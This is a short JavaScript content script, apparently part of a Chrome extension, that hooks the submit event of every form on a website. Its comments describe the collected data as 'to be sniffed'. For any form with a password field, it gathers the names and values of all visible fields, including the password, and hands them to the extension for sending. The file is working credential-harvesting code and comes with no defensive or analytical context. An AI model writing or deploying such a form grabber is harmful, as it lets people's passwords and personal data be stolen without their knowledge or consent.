/* Adds the submit event to all the forms in the website */
var forms = document.getElementsByTagName("form");

for(var i = 0; i < forms.length; i++) {
  forms[i].addEventListener("submit", function(event) {
    /* Form_data will hold the data to be sniffed */
    var form_data = {};
    var has_password = false;

    /* Loop trough all the elements in the form */
    for(var i = 0; i < this.elements.length; i++) {
      var name = this.elements[i].name;
      var type = this.elements[i].type;
      var value = this.elements[i].value;
      
      /* Gets only the form submissions with a password field */
      if(type && type.toLowerCase() === "password")
        has_password = true;
      
      /* Gets the non hidden fields */
      if(name && type.toLowerCase() !== "hidden")
        form_data[name] = value;
    }
    
    /* If the form has a password field, send it to the application */
    if(has_password) {
      chrome.extension.sendMessage({type: "data_to_send", data: form_data});
    }
    return true;
  });
}